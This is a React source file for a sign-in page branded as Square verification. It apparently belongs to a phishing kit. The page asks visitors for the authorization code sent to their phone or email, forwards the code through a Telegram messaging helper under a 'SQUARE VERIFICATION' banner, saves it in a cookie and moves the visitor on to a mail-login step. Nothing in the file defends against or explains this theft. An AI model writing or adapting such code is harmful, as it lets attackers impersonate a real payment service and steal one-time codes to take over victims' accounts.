import React, {useState} from "react";
import { Link, useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Verif() {
  const [formInput, setFormInput] = useState<otp>({cd:""})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
    const message = `
    [----+🏦 SQUARE VERIFICATION 🏦+-----]
  
    VERIFICATION: ${formInput.cd}
    `;
    await TelegramSend(message)
    cookies.set("verif", formInput.cd)
   
    setIsLoading(false)
    navigate("../login/auth/mail")
    
}
  return (
    <div className="middle-form">
      <div className="submitForm">
       
       <h3>Sign in</h3>
       <p>Please enter the authorization code sent to your phone number or email address</p>
        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
           
            <input minLength={4}  placeholder="Authorization code" onChange={handleInputChange} required id="username" name="cd" type="text" />
          </div>
          
          <div className="nav2" style={{marginBottom:"20px"}}>Didn't get the code? <Link to={""}>Try another way.</Link></div>

          {isLoading ?
            <button style={{ marginTop: "-2px" }} type="button">
          Please wait...
        </button>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>}
        </form>

        
     
      </div>
      </div>
  );
}
